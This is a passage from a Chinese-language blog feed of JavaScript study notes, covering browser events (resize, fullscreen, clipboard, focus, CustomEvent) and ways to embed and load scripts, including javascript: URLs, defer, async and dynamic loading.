<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> resizeMethod = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>.body.clientWidth &lt; <span class="number">768</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;移动设备的视口&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;resize&#x27;</span>, resizeMethod, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>该事件也会连续地大量触发，所以最好像上面的<code>scroll</code>事件一样，通过<code>throttle</code>函数控制事件触发频率。</p>
<h5 id="10-4-3-fullscreenchange-事件，fullscreenerror-事件"><a href="#10-4-3-fullscreenchange-事件，fullscreenerror-事件" class="headerlink" title="10.4.3 fullscreenchange 事件，fullscreenerror 事件"></a>10.4.3 fullscreenchange 事件，fullscreenerror 事件</h5><p><code>fullscreenchange</code>事件在进入或退出全屏状态时触发，该事件发生在<code>document</code>对象上面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;fullscreenchange&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">document</span>.fullscreenElement);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><code>fullscreenerror</code>事件在浏览器无法切换到全屏状态时触发。</p>
<h4 id="10-5-剪贴板事件"><a href="#10-5-剪贴板事件" class="headerlink" title="10.5 剪贴板事件"></a>10.5 剪贴板事件</h4><p>以下三个事件属于剪贴板操作的相关事件。</p>
<ul>
<li><code>cut</code>：将选中的内容从文档中移除，加入剪贴板时触发。</li>
<li><code>copy</code>：进行复制动作时触发。</li>
<li><code>paste</code>：剪贴板内容粘贴到文档后触发。</li>
</ul>
<p>举例来说，如果希望禁止输入框的粘贴事件，可以使用下面的代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">inputElement.addEventListener(<span class="string">&#x27;paste&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> e.preventDefault());</span><br></pre></td></tr></table></figure>
<p>上面的代码使得用户无法在<code>&lt;input&gt;</code>输入框里面粘贴内容。</p>
<p><code>cut</code>、<code>copy</code>、<code>paste</code>这三个事件的事件对象都是<code>ClipboardEvent</code>接口的实例。<code>ClipboardEvent</code>有一个实例属性<code>clipboardData</code>，是一个 DataTransfer 对象，存放剪贴的数据。具体的 API 接口和操作方法，请参见《拖拉事件》的 DataTransfer 对象部分。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;copy&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  e.clipboardData.setData(<span class="string">&#x27;text/plain&#x27;</span>, <span class="string">&#x27;Hello, world!&#x27;</span>);</span><br><span class="line">  e.clipboardData.setData(<span class="string">&#x27;text/html&#x27;</span>, <span class="string">&#x27;&lt;b&gt;Hello, world!&lt;/b&gt;&#x27;</span>);</span><br><span class="line">  e.preventDefault();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面的代码使得复制进入剪贴板的，都是开发者指定的数据，而不是用户想要拷贝的数据。</p>
<h4 id="10-6-焦点事件"><a href="#10-6-焦点事件" class="headerlink" title="10.6 焦点事件"></a>10.6 焦点事件</h4><p>焦点事件发生在元素节点和<code>document</code>对象上面，与获得或失去焦点相关。它主要包括以下四个事件。</p>
<ul>
<li><code>focus</code>：元素节点获得焦点后触发，该事件不会冒泡。</li>
<li><code>blur</code>：元素节点失去焦点后触发，该事件不会冒泡。</li>
<li><code>focusin</code>：元素节点将要获得焦点时触发，发生在<code>focus</code>事件之前。该事件会冒泡。</li>
<li><code>focusout</code>：元素节点将要失去焦点时触发，发生在<code>blur</code>事件之前。该事件会冒泡。</li>
</ul>
<p>这四个事件的事件对象都继承了<code>FocusEvent</code>接口。<code>FocusEvent</code>实例具有以下属性。</p>
<p><code>FocusEvent.target</code>：事件的目标节点。<br><code>FocusEvent.relatedTarget</code>：对于<code>focusin</code>事件，返回失去焦点的节点；对于<code>focusout</code>事件，返回将要接受焦点的节点；对于<code>focus</code>和<code>blur</code>事件，返回<code>null</code>。<br>由于<code>focus</code>和<code>blur</code>事件不会冒泡，只能在捕获阶段触发，所以<code>addEventListener</code>方法的第三个参数需要设为<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">form.addEventListener(<span class="string">&#x27;focus&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.target.style.background = <span class="string">&#x27;pink&#x27;</span>;</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">form.addEventListener(<span class="string">&#x27;blur&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.target.style.background = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码针对表单的文本输入框，接受焦点时设置背景色，失去焦点时去除背景色。</p>
<h4 id="10-7-CustomEvent-接口"><a href="#10-7-CustomEvent-接口" class="headerlink" title="10.7 CustomEvent 接口"></a>10.7 CustomEvent 接口</h4><p>CustomEvent 接口用于生成自定义的事件实例。那些浏览器预定义的事件，虽然可以手动生成，但是往往不能在事件上绑定数据。如果需要在触发事件的同时，传入指定的数据，就可以使用 CustomEvent 接口生成的自定义事件对象。</p>
<p>浏览器原生提供<code>CustomEvent()</code>构造函数，用来生成 CustomEvent 事件实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> CustomEvent(type, options)</span><br></pre></td></tr></table></figure>
<p><code>CustomEvent()</code>构造函数接受两个参数。第一个参数是字符串，表示事件的名字，这是必须的。第二个参数是事件的配置对象，这个参数是可选的。<code>CustomEvent</code>的配置对象除了接受 Event 事件的配置属性，只有一个自己的属性。</p>
<ul>
<li><code>detail</code>：表示事件的附带数据，默认为<code>null</code>。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> event = <span class="keyword">new</span> CustomEvent(<span class="string">&#x27;build&#x27;</span>, &#123; <span class="string">&#x27;detail&#x27;</span>: <span class="string">&#x27;hello&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">eventHandler</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.detail);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">&#x27;build&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.detail);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.dispatchEvent(event);</span><br></pre></td></tr></table></figure>
<p>上面代码中，我们手动定义了<code>build</code>事件。该事件触发后，会被监听到，从而输出该事件实例的<code>detail</code>属性（即字符串<code>hello</code>）。</p>
<p>下面是另一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myEvent = <span class="keyword">new</span> CustomEvent(<span class="string">&#x27;myevent&#x27;</span>, &#123;</span><br><span class="line">  detail: &#123;</span><br><span class="line">    foo: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  bubbles: <span class="literal">true</span>,</span><br><span class="line">  cancelable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">el.addEventListener(<span class="string">&#x27;myevent&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Hello &#x27;</span> + event.detail.foo);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">el.dispatchEvent(myEvent);</span><br></pre></td></tr></table></figure>
<p>上面代码也说明，CustomEvent 的事件实例，除了具有 Event 接口的实例属性，还具有<code>detail</code>属性。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 事件-其他常见事件</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0055</title>
    <url>/2021/05/30/%E6%89%93%E5%8D%A10055/</url>
    <content><![CDATA[<p><font color=#7a1723>我与春风皆过客，你携秋水揽星河。</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="1-浏览器环境概述"><a href="#1-浏览器环境概述" class="headerlink" title="1. 浏览器环境概述"></a>1. 浏览器环境概述</h3><p>JavaScript 是浏览器的内置脚本语言。也就是说，浏览器内置了 JavaScript 引擎，并且提供各种接口，让 JavaScript 脚本可以控制浏览器的各种功能。一旦网页内嵌了 JavaScript 脚本，浏览器加载网页，就会去执行脚本，从而达到操作浏览器的目的，实现网页的各种动态效果。</p>
<p>本章开始介绍浏览器提供的各种 JavaScript 接口。首先，介绍 JavaScript 代码嵌入网页的方法。</p>
<h4 id="1-1-代码嵌入网页的方法"><a href="#1-1-代码嵌入网页的方法" class="headerlink" title="1.1 代码嵌入网页的方法"></a>1.1 代码嵌入网页的方法</h4><p>网页中嵌入 JavaScript 代码，主要有四种方法。</p>
<ul>
<li><code>&lt;script&gt;</code>元素直接嵌入代码。</li>
<li><code>&lt;script&gt;</code>标签加载外部脚本</li>
<li>事件属性</li>
<li>URL 协议</li>
</ul>
<span id="more"></span>
<h5 id="1-1-1-script-元素嵌入代码"><a href="#1-1-1-script-元素嵌入代码" class="headerlink" title="1.1.1 script 元素嵌入代码"></a>1.1.1 script 元素嵌入代码</h5><p><code>&lt;script&gt;</code>元素内部可以直接写入 JavaScript 代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="number">1</span> + <span class="number">5</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><code>&lt;script&gt;</code>标签有一个<code>type</code>属性，用来指定脚本类型。对 JavaScript 脚本来说，<code>type</code>属性可以设为两种值。</p>
<ul>
<li><code>text/javascript</code>：这是默认值，也是历史上一贯设定的值。如果你省略<code>type</code>属性，默认就是这个值。对于老式浏览器，设为这个值比较好。</li>
<li><code>application/javascript</code>：对于较新的浏览器，建议设为这个值。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;application/javascript&quot;</span>&gt;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>由于<code>&lt;script&gt;</code>标签默认就是 JavaScript 代码。所以，嵌入 JavaScript 脚本时，<code>type</code>属性可以省略。</p>
<p>如果<code>type</code>属性的值，浏览器不认识，那么它不会执行其中的代码。利用这一点，可以在<code>&lt;script&gt;</code>标签之中嵌入任意的文本内容，只要加上一个浏览器不认识的<code>type</code>属性即可。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script id=<span class="string">&quot;mydata&quot;</span> type=<span class="string">&quot;x-custom-data&quot;</span>&gt;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>上面的代码，浏览器不会执行，也不会显示它的内容，因为不认识它的<code>type</code>属性。但是，这个<code>&lt;script&gt;</code>节点依然存在于 DOM 之中，可以使用<code>&lt;script&gt;</code>节点的<code>text</code>属性读出它的内容。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;mydata&#x27;</span>).text</span><br><span class="line"><span class="comment">//   console.log(&#x27;Hello World&#x27;);</span></span><br></pre></td></tr></table></figure>

<h5 id="1-1-2-script-元素加载外部脚本"><a href="#1-1-2-script-元素加载外部脚本" class="headerlink" title="1.1.2 script 元素加载外部脚本"></a>1.1.2 script 元素加载外部脚本</h5><p><code>&lt;script&gt;</code>标签也可以指定加载外部的脚本文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://www.example.com/script.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>如果脚本文件使用了非英语字符，还应该注明字符的编码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script charset=<span class="string">&quot;utf-8&quot;</span> src=<span class="string">&quot;https://www.example.com/script.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>所加载的脚本必须是纯的 JavaScript 代码，不能有<code>HTML</code>代码和<code>&lt;script&gt;</code>标签。<br>加载外部脚本和直接添加代码块，这两种方法不能混用。下面代码的<code>console.log</code>语句直接被忽略。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script charset=<span class="string">&quot;utf-8&quot;</span> src=<span class="string">&quot;example.js&quot;</span>&gt;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Hello World!&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>为了防止攻击者篡改外部脚本，<code>script</code>标签允许设置一个<code>integrity</code>属性，写入该外部脚本的 Hash 签名，用来验证脚本的一致性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/assets/application.js&quot;</span></span><br><span class="line">  integrity=<span class="string">&quot;sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs=&quot;</span>&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>script</code>标签有一个<code>integrity</code>属性，指定了外部脚本<code>/assets/application.js</code>的 SHA256 签名。一旦有人改了这个脚本，导致 SHA256 签名不匹配，浏览器就会拒绝加载。</p>
<h5 id="1-1-3-事件属性"><a href="#1-1-3-事件属性" class="headerlink" title="1.1.3 事件属性"></a>1.1.3 事件属性</h5><p>网页元素的事件属性（比如<code>onclick</code>和<code>onmouseover</code>），可以写入 JavaScript 代码。当指定事件发生时，就会调用这些代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;button id=<span class="string">&quot;myBtn&quot;</span> onclick=<span class="string">&quot;console.log(this.id)&quot;</span>&gt;点击&lt;/button&gt;</span><br></pre></td></tr></table></figure>
<p>上面的事件属性代码只有一个语句。如果有多个语句，使用分号分隔即可。</p>
<h5 id="1-1-4-URL-协议"><a href="#1-1-4-URL-协议" class="headerlink" title="1.1.4 URL 协议"></a>1.1.4 URL 协议</h5><p>URL 支持<code>javascript:</code>协议，即在 URL 的位置写入代码，使用这个 URL 的时候就会执行 JavaScript 代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:console.log(&#x27;Hello&#x27;)&quot;</span>&gt;点击&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>浏览器的地址栏也可以执行<code>javascript:</code>协议。将<code>javascript:console.log(&#39;Hello&#39;)</code>放入地址栏，按回车键也会执行这段代码。</p>
<p>如果 JavaScript 代码返回一个字符串，浏览器就会新建一个文档，展示这个字符串的内容，原有文档的内容都会消失。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript: new Date().toLocaleTimeString();&quot;</span>&gt;点击&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，用户点击链接以后，会打开一个新文档，里面有当前时间。</p>
<p>如果返回的不是字符串，那么浏览器不会新建文档，也不会跳转。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript: console.log(new Date().toLocaleTimeString())&quot;</span>&gt;点击&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，用户点击链接后，网页不会跳转，只会在控制台显示当前时间。</p>
<p><code>javascript:</code>协议的常见用途是书签脚本 Bookmarklet。由于浏览器的书签保存的是一个网址，所以<code>javascript:</code>网址也可以保存在里面，用户选择这个书签的时候，就会在当前页面执行这个脚本。为了防止书签替换掉当前文档，可以在脚本前加上<code>void</code>，或者在脚本最后加上<code>void 0</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript: void new Date().toLocaleTimeString();&quot;</span>&gt;点击&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;javascript: new Date().toLocaleTimeString();void 0;&quot;</span>&gt;点击&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>上面这两种写法，点击链接后，执行代码都不会网页跳转。</p>
<h4 id="1-2-script-元素"><a href="#1-2-script-元素" class="headerlink" title="1.2 script 元素"></a>1.2 script 元素</h4><h5 id="1-2-1-工作原理"><a href="#1-2-1-工作原理" class="headerlink" title="1.2.1 工作原理"></a>1.2.1 工作原理</h5><p>浏览器加载 JavaScript 脚本，主要通过<code>&lt;script&gt;</code>元素完成。正常的网页加载流程是这样的。</p>
<ol>
<li>浏览器一边下载 HTML 网页，一边开始解析。也就是说，不等到下载完，就开始解析。</li>
<li>解析过程中，浏览器发现<code>&lt;script&gt;</code>元素，就暂停解析，把网页渲染的控制权转交给 JavaScript 引擎。</li>
<li>如果<code>&lt;script&gt;</code>元素引用了外部脚本，就下载该脚本再执行，否则就直接执行代码。</li>
<li>JavaScript 引擎执行完毕，控制权交还渲染引擎，恢复往下解析 HTML 网页。</li>
</ol>
<p>加载外部脚本时，浏览器会暂停页面渲染，等待脚本下载并执行完成后，再继续渲染。原因是 JavaScript 代码可以修改 DOM，所以必须把控制权让给它，否则会导致复杂的线程竞赛的问题。</p>
<p>如果外部脚本加载时间很长（一直无法完成下载），那么浏览器就会一直等待脚本下载完成，造成网页长时间失去响应，浏览器就会呈现“假死”状态，这被称为“阻塞效应”。</p>
<p>为了避免这种情况，较好的做法是将<code>&lt;script&gt;</code>标签都放在页面底部，而不是头部。这样即使遇到脚本失去响应，网页主体的渲染也已经完成了，用户至少可以看到内容，而不是面对一张空白的页面。如果某些脚本代码非常重要，一定要放在页面头部的话，最好直接将代码写入页面，而不是连接外部脚本文件，这样能缩短加载时间。</p>
<p>脚本文件都放在网页尾部加载，还有一个好处。因为在 DOM 结构生成之前就调用 DOM 节点，JavaScript 会报错，如果脚本都在网页尾部加载，就不存在这个问题，因为这时 DOM 肯定已经生成了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">document</span>.body.innerHTML);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码执行时会报错，因为此时<code>document.body</code>元素还未生成。</p>
<p>一种解决方法是设定<code>DOMContentLoaded</code>事件的回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(</span><br><span class="line">      <span class="string">&#x27;DOMContentLoaded&#x27;</span>,</span><br><span class="line">      <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">document</span>.body.innerHTML);</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，指定<code>DOMContentLoaded</code>事件发生后，才开始执行相关代码。<code>DOMContentLoaded</code>事件只有在 DOM 结构生成之后才会触发。</p>
<p>另一种解决方法是，使用<code>&lt;script&gt;</code>标签的<code>onload</code>属性。当<code>&lt;script&gt;</code>标签指定的外部脚本文件下载和解析完成，会触发一个<code>load</code>事件，可以把所需执行的代码，放在这个事件的回调函数里面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;jquery.min.js&quot;</span> onload=<span class="string">&quot;console.log(document.body.innerHTML)&quot;</span>&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>但是，如果将脚本放在页面底部，就可以完全按照正常的方式写，上面两种方式都不需要。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;!-- 其他代码  --&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">document</span>.body.innerHTML);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>如果有多个<code>script</code>标签，比如下面这样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;a.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;b.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>浏览器会同时并行下载<code>a.js</code>和<code>b.js</code>，但是，执行时会保证先执行<code>a.js</code>，然后再执行<code>b.js</code>，即使后者先下载完成，也是如此。也就是说，脚本的执行顺序由它们在页面中的出现顺序决定，这是为了保证脚本之间的依赖关系不受到破坏。当然，加载这两个脚本都会产生“阻塞效应”，必须等到它们都加载完成，浏览器才会继续页面渲染。</p>
<p>解析和执行 CSS，也会产生阻塞。Firefox 浏览器会等到脚本前面的所有样式表，都下载并解析完，再执行脚本；Webkit则是一旦发现脚本引用了样式，就会暂停执行脚本，等到样式表下载并解析完，再恢复执行。</p>
<p>此外，对于来自同一个域名的资源，比如脚本文件、样式表文件、图片文件等，浏览器一般有限制，同时最多下载6～20个资源，即最多同时打开的 TCP 连接有限制，这是为了防止对服务器造成太大压力。如果是来自不同域名的资源，就没有这个限制。所以，通常把静态文件放在不同的域名之下，以加快下载速度。</p>
<h5 id="1-2-2-defer-属性"><a href="#1-2-2-defer-属性" class="headerlink" title="1.2.2 defer 属性"></a>1.2.2 defer 属性</h5><p>为了解决脚本文件下载阻塞网页渲染的问题，一个方法是对<code>&lt;script&gt;</code>元素加入<code>defer</code>属性。它的作用是延迟脚本的执行，等到 DOM 加载生成后，再执行脚本。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;a.js&quot;</span> defer&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;b.js&quot;</span> defer&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，只有等到 DOM 加载完成后，才会执行<code>a.js</code>和<code>b.js</code>。</p>
<p><code>defer</code>属性的运行流程如下。</p>
<ol>
<li>浏览器开始解析 HTML 网页。</li>
<li>解析过程中，发现带有<code>defer</code>属性的<code>&lt;script&gt;</code>元素。</li>
<li>浏览器继续往下解析 HTML 网页，同时并行下载<code>&lt;script&gt;</code>元素加载的外部脚本。</li>
<li>浏览器完成解析 HTML 网页，此时再回过头执行已经下载完成的脚本。</li>
</ol>
<p>有了<code>defer</code>属性，浏览器下载脚本文件的时候，不会阻塞页面渲染。下载的脚本文件在<code>DOMContentLoaded</code>事件触发前执行（即刚刚读取完<code>&lt;/html&gt;</code>标签），而且可以保证执行顺序就是它们在页面上出现的顺序。</p>
<p>对于内置而不是加载外部脚本的<code>script</code>标签，以及动态生成的<code>script</code>标签，<code>defer</code>属性不起作用。另外，使用<code>defer</code>加载的外部脚本不应该使用<code>document.write</code>方法。</p>
<h5 id="1-2-3-async-属性"><a href="#1-2-3-async-属性" class="headerlink" title="1.2.3 async 属性"></a>1.2.3 async 属性</h5><p>解决“阻塞效应”的另一个方法是对<code>&lt;script&gt;</code>元素加入<code>async</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;a.js&quot;</span> <span class="keyword">async</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;b.js&quot;</span> <span class="keyword">async</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><code>async</code>属性的作用是，使用另一个进程下载脚本，下载时不会阻塞渲染。</p>
<ol>
<li>浏览器开始解析 HTML 网页。</li>
<li>解析过程中，发现带有<code>async</code>属性的<code>script</code>标签。</li>
<li>浏览器继续往下解析 HTML 网页，同时并行下载<code>&lt;script&gt;</code>标签中的外部脚本。</li>
<li>脚本下载完成，浏览器暂停解析 HTML 网页，开始执行下载的脚本。</li>
<li>脚本执行完毕，浏览器恢复解析 HTML 网页。</li>
</ol>
<p><code>async</code>属性可以保证脚本下载的同时，浏览器继续渲染。需要注意的是，一旦采用这个属性，就无法保证脚本的执行顺序。哪个脚本先下载结束，就先执行那个脚本。另外，使用<code>async</code>属性的脚本文件里面的代码，不应该使用<code>document.write</code>方法。</p>
<p><code>defer</code>属性和<code>async</code>属性到底应该使用哪一个？</p>
<p>一般来说，如果脚本之间没有依赖关系，就使用<code>async</code>属性，如果脚本之间有依赖关系，就使用<code>defer</code>属性。如果同时使用<code>async</code>和<code>defer</code>属性，后者不起作用，浏览器行为由<code>async</code>属性决定。</p>
<h5 id="1-2-4-脚本的动态加载"><a href="#1-2-4-脚本的动态加载" class="headerlink" title="1.2.4 脚本的动态加载"></a>1.2.4 脚本的动态加载</h5><p><code>&lt;script&gt;</code>元素还可以动态生成，生成后再插入页面，从而实现脚本的动态加载。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;a.js&#x27;</span>, <span class="string">&#x27;b.js&#x27;</span>].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">src</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  script.src = src;</span><br><span class="line">  <span class="built_in">document</span>.head.appendChild(script);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这种方法的好处是，动态生成的<code>script</code>标签不会阻塞页面渲染，也就不会造成浏览器假死。但是问题在于，这种方法无法保证脚本的执行顺序，哪个脚本文件先下载完成，就先执行哪个。</p>
<p>如果想避免这个问题，可以设置<code>async</code>属性为<code>false</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;a.js&#x27;</span>, <span class="string">&#x27;b.js&#x27;</span>].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">src</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  script.src = src;</span><br><span class="line">  script.async = <span class="literal">false</span>;</span><br><span class="line">  <span class="built_in">document</span>.head.appendChild(script);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面的代码不会阻塞页面渲染，而且可以保证<code>b.js</code>在<code>a.js</code>后面执行。不过需要注意的是，在这段代码后面加载的脚本文件，会因此都等待<code>b.js</code>执行完成后再执行。</p>
<p>如果想为动态加载的脚本指定回调函数，可以使用下面的写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadScript</span>(<span class="params">src, done</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> js = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  js.src = src;</span><br><span class="line">  js.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    done();</span><br><span class="line">  &#125;;</span><br><span class="line">  js.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    done(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Failed to load script &#x27;</span> + src));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">document</span>.head.appendChild(js);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="1-2-5-加载使用的协议"><a href="#1-2-5-加载使用的协议" class="headerlink" title="1.2.5 加载使用的协议"></a>1.2.5 加载使用的协议</h5><p>如果不指定协议，浏览器默认采用 HTTP 协议下载。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;example.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>上面的<code>example.js</code>默认就是采用 HTTP 协议下载，如果要采用 HTTPS 协议下载，必需写明。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://example.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>但是有时我们会希望，根据页面本身的协议来决定加载协议，这时可以采用下面的写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;//example.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

